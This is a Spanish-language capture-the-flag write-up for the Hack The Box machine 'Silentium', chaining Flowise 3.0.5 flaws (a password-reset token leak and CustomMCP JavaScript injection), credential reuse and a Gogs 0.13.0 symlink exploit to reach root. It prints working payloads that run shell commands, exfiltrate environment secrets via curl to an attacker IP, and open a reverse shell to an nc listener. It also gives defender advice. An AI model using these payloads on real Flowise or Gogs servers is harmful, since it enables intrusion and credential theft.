Descripción de la Máquina

Silentium es una máquina Linux de dificultad Easy en Hack The Box que simula una empresa financiera institucional (Silentium Capital & Lending). La superficie de ataque combina tres vulnerabilidades críticas de día cero encadenadas: un reset de contraseña sin autenticación en Flowise AI, una inyección en el nodo CustomMCP que permite RCE en el contenedor Docker, y una vulnerabilidad de enlace simbólico en Gogs que otorga ejecución de código como root en el host.

La cadena completa exige entender la arquitectura multi-servicio: un sitio corporativo en nginx, una instancia de Flowise AI en subdominio staging.silentium.htb, y un servidor Gogs interno en 127.0.0.1:3001 corriendo como root, accesible solo desde el host.

Resumen de Vulnerabilidades

CVE-2025-58434 Flowise 3.0.5 Reset de contraseña sin autenticación — el endpoint /api/v1/account/forgot-password devuelve el tempToken en la respuesta JSON sin requerir verificación de identidad. Critical
CVE-2025-59528 Flowise 3.0.5 Inyección en CustomMCP — la función convertToValidJSONString pasa el parámetro mcpServerConfig directamente al constructor Function() de Node.js, permitiendo ejecución arbitraria de JavaScript con privilegios de root dentro del contenedor. Critical

Fase 1 — Reconocimiento
1
Escaneo de puertos con Nmap
¿Por qué este paso? Todo pentest comienza identificando la superficie de ataque. Nmap es la herramienta estándar para descubrir qué servicios expone el objetivo y en qué puertos. Primero escaneamos todos los puertos (-p-) rápidamente para no perdernos nada, y luego profundizamos solo en los abiertos.
$ nmap -p- --open -n -T4 --min-rate 5000 10.129.26.220
$ nmap -p22,80 -sC -sV 10.129.26.220
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://silentium.htb/
¿Qué nos dice este output? Solo dos puertos abiertos: SSH (22) y HTTP (80). El servidor web redirige a silentium.htb, indicando virtual hosting. Esto significa que el nombre de dominio es importante y debemos agregarlo a /etc/hosts. Con tan pocos puertos, el vector de entrada casi seguro pasa por la web.
Decisión Agregar 10.129.26.220 silentium.htb staging.silentium.htb a /etc/hosts y enumerar el sitio web y sus subdominios.
2
Descubrimiento de subdominios y servicios web
¿Por qué este paso? Nginx puede servir múltiples aplicaciones en el mismo puerto 80 usando virtual hosting por nombre de dominio. Un subdominio diferente puede exponer una aplicación completamente distinta con su propia superficie de ataque.
$ curl -si http://silentium.htb/ # Confirmar sitio principal
$ wget -qO- http://staging.silentium.htb/ | head -5 # Probar subdominio
<title>Flowise - Build AI Agents, Visually</title> <meta name="author" content="FlowiseAI" />
¿Qué nos dice este output? El subdominio staging.silentium.htb expone una instancia de Flowise AI, una plataforma open-source para construir agentes de IA con LLMs. Al verificar la versión: {"version":"3.0.5"}. Esta versión es vulnerable a CVE-2025-58434 y CVE-2025-59528.
Decisión Explotar CVE-2025-58434 para tomar control de la cuenta administradora de Flowise sin conocer la contraseña.
Fase 2 — Explotación Flowise (Foothold en Contenedor)
3
CVE-2025-58434 — Password Reset sin Autenticación
¿Qué es CVE-2025-58434? El endpoint POST /api/v1/account/forgot-password de Flowise Enterprise está diseñado para enviar un token de reset por email. Sin embargo, debido a un error de implementación, el tempToken se devuelve directamente en la respuesta JSON de la API, en lugar de enviarse solo por correo. Esto permite a cualquier atacante obtener el token sin acceso al correo electrónico de la víctima.
$ curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin", "email":"ben@silentium.htb", "tempToken":"SNRBZURjOnWCjJnTHpcL0IK7iVwYcZDGNFv95Oj8lipk4mTK4m2j8vGBXBR32389", "tokenExpiry":"2026-04-12T11:59:42.125Z","status":"active",...}}
¿Qué nos dice este output? El servidor devuelve el tempToken en texto plano en la respuesta. Este token, combinado con el email del usuario, permite cambiar la contraseña sin conocer la original. El campo tokenExpiry indica que expira en ~15 minutos — hay que actuar rápido.
# Usar el tempToken para establecer nueva contraseña
$ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"tempToken": "SNRBZU...", "email": "ben@silentium.htb", "password": "H4ck3d123!"}}'
{"user":{"credential":"$2a$05$zwe.qKKUtqzZqZWPcxY51e...","tempToken":"","status":"active",...}}
¿Qué nos dice este output? tempToken vacío y nuevo hash credential confirmados — contraseña cambiada exitosamente. Login en la UI de Flowise con ben@silentium.htb : H4ck3d123! para obtener la API key.
Decisión Acceder al panel de Flowise → Settings → API Keys → Crear key → Usar para CVE-2025-59528.
4
CVE-2025-59528 — CustomMCP Injection → RCE como root en contenedor
¿Qué es CVE-2025-59528? El nodo CustomMCP de Flowise permite configurar servidores MCP externos. La función convertToValidJSONString toma el parámetro mcpServerConfig y lo pasa directamente al constructor Function('return ' + inputString)() de JavaScript sin sanitizar. Esto permite ejecutar código JavaScript arbitrario en el proceso Node.js del servidor, que corre como root dentro del contenedor Docker.
# Verificar RCE con sleep (time-based)
$ time curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer HvH4ymS6dga9sijX_uP3e0xNBRS2rv6BDL-PGL4Phpo" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(\"sleep 5\");return 1;})()})"
real 0m5.217s ← 5 segundos de delay confirman ejecución
¿Qué nos dice este output? El request tardó exactamente 5 segundos — el sleep 5 se ejecutó en el servidor. RCE confirmado. El proceso corre como uid=0(root) dentro del contenedor (verificado con callback HTTP).
# Exfiltrar datos via curl callback a HTTP server local
$ python3 -m http.server 80 # En terminal separada

# Payload que exfiltra variables de entorno
$ curl ... -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp=process.mainModule.require(\"child_process\");const r=cp.execSync(\"env|grep -iE pass|secret\").toString();cp.execSync(\"curl http://10.10.14.31/?d=\"+Buffer.from(r).toString(\"base64\"));return 1;})()})"
10.129.26.220 - GET /?d=RkxPV0lTRV9QQVNTV09SRD1GMWwzX2QwY2szcgpTTVRQX1BBU1NXT1JE... # Decodificado base64: FLOWISE_PASSWORD=F1l3_d0ck3r SMTP_PASSWORD=r04D!!_R4ge JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDD
¿Qué nos dice este output? Credenciales extraídas del entorno del contenedor. La contraseña r04D!!_R4ge es reutilizada para el usuario ben en SSH del host. Este es el patrón de reutilización de credenciales más común en entornos Docker mal configurados.
Decisión Conectarse por SSH como ben con la contraseña exfiltrada y obtener user.txt.
Fase 3 — Acceso al Host (User Flag)
5
SSH como ben — Credenciales reutilizadas del contenedor
¿Por qué funciona? La contraseña SMTP_PASSWORD=r04D!!_R4ge encontrada en las variables de entorno del contenedor fue reutilizada para el usuario ben en el host. Esta es una mala práctica muy común en infraestructuras donde el mismo administrador gestiona tanto los contenedores como los sistemas operativos subyacentes.
$ ssh ben@10.129.26.220 # Password: r04D!!_R4ge
ben@silentium:~$ cat user.txt

Flag capturada. Acceso como ben en el host. Enumeración post-acceso revela Gogs 0.13.0 corriendo como root en 127.0.0.1:3001 — vulnerable a CVE-2025-8110.

Enumeración del host — Descubrimiento de Gogs interno

Decisión Crear túnel SSH para acceder a Gogs, registrar usuario, y ejecutar CVE-2025-8110.
Fase 4 — Escalada de Privilegios (CVE-2025-8110 Gogs RCE)
7
CVE-2025-8110 — Gogs Symlink Race Condition → RCE como root
¿Qué es CVE-2025-8110? Gogs 0.13.0 tiene una vulnerabilidad de enlace simbólico en el manejo de repositorios git. Un usuario autenticado puede: (1) crear un repo, (2) subir un symlink malicious_link → .git/config, (3) usar la API para sobreescribir el archivo a través del symlink con un git config malicioso que incluye sshCommand = /bin/bash -c 'reverse shell'. Cuando Gogs procesa una operación git interna (como git fetch), ejecuta el sshCommand con los privilegios del proceso de Gogs — en este caso, root.
# Paso 1: Túnel SSH para acceder a Gogs
$ ssh -L 3001:127.0.0.1:3001 ben@10.129.26.220

# Paso 2: Registrar usuario en http://localhost:3001 (browser)
# Paso 3: Generar API token en Settings → Applications

# Paso 4: Ejecutar exploit
$ python3 CVE-2025-8110.py \
  -u http://127.0.0.1:3001 \
  -lh 10.10.14.31 \
  -lp 5555 \
  --skip-register -user pedro -pass admin123 \
  -token 3ff926a33d4bf24efe319e2d966e721e049d3fb1
[+] Using provided API token [+] Authenticated successfully Repo creation status: 201 Cloning into '/tmp/279fcf71ea82'... [master 255dac0] Add malicious symlink To http://127.0.0.1:3001/pedro/279fcf71ea82.git f3be57f..255dac0 master -> master [+] Exploit sent, check your listener! # En listener nc -lvnp 5555: connect to [10.10.14.31] from [10.129.27.58] 51204 root@silentium:/opt/gogs/gogs/data/tmp/local-repo/4# whoami root
Shell root obtenida. El exploit crea un repositorio, sube el symlink malicious_link → .git/config, sobreescribe el config con un sshCommand malicioso, y cuando Gogs procesa el PUT del archivo, ejecuta el comando como root, enviando una reverse shell al listener.

Lecciones Aprendidas — Para el Atacante
🔑
Reutilización de credenciales entre contenedor y host
Las variables de entorno del contenedor Docker (SMTP_PASSWORD) contenían la misma contraseña del usuario SSH del host. Siempre exfiltrar env, printenv y archivos .env desde cualquier RCE en contenedor.
🔗
Exfiltración de datos cuando no hay reverse shell directa
Cuando el contenedor no podía conectar en puertos altos (4444), el puerto 80 sí tenía salida. La técnica de callback HTTP con base64 es universal: curl http://attacker/?d=$(command|base64 -w0).
🧬
Servicios internos como vector de privesc
ss -tlnp reveló Gogs en 127.0.0.1:3001 corriendo como root. Los servicios que escuchan solo en localhost son frecuentemente olvidados por los hardening teams y representan vectores de escalada críticos.
Recomendaciones para el Defensor
🛡️
Actualizar Flowise a versión 3.0.6+
CVE-2025-58434 y CVE-2025-59528 fueron corregidos en Flowise 3.0.6. El endpoint forgot-password no debe devolver el tempToken en la respuesta. El CustomMCP debe sanitizar la entrada antes de pasarla al constructor Function().
🐳
No reutilizar contraseñas entre contenedores y hosts
Las variables de entorno de Docker son accesibles para cualquier proceso dentro del contenedor. Usar secretos de Docker (docker secrets) o un vault como HashiCorp Vault para credenciales sensibles.
🔒
No ejecutar Gogs (ni ningún servicio) como root
El archivo app.ini tenía RUN_USER = root. Crear un usuario dedicado de baja privilegio para ejecutar Gogs. Un RCE en el servicio no debe comprometer el sistema operativo completo.
📡
Actualizar Gogs o migrar a Gitea
Gogs 0.13.0 es vulnerable a CVE-2025-8110. Actualizar a la última versión disponible o considerar migrar a Gitea (fork activamente mantenido de Gogs) que tiene mejor historial de seguridad.
Glosario Técnico
Flowise AI
Plataforma open-source para construir agentes de IA y flujos con LLMs de forma visual. Expone una API REST que permite interactuar con nodos de procesamiento. En su versión 3.0.5, contiene vulnerabilidades críticas de autenticación y RCE.
MCP (Model Context Protocol)
Protocolo estándar para conectar modelos de lenguaje con herramientas externas. El nodo CustomMCP en Flowise permite especificar configuraciones de servidores MCP — la vulnerabilidad está en que esta configuración se evalúa como código JavaScript.
Symlink Attack (Enlace Simbólico)
Técnica donde un atacante crea un enlace simbólico que apunta a un archivo sensible. Cuando una operación privilegiada sigue el enlace para leer/escribir, accidentalmente lee o sobreescribe el archivo objetivo en lugar del esperado.
sshCommand (git config)
Directiva de configuración de git que especifica qué comando usar como cliente SSH al conectarse a repositorios remotos via SSH. Permite inyección de comandos porque git ejecuta este valor directamente en el shell cuando realiza operaciones remotas.
ETXTBSY (Text file busy)
Error del kernel Linux que se produce cuando se intenta escribir en un ejecutable que está siendo usado activamente por algún proceso. Previene modificar binarios en ejecución, lo que protege la integridad del sistema pero también puede ser un obstáculo en ciertos ataques.
Virtual Hosting (nginx)
Técnica que permite a un servidor web servir múltiples sitios web desde la misma dirección IP, diferenciándolos por el nombre de dominio en el header HTTP Host. Común en CTFs para esconder aplicaciones adicionales bajo subdominios.
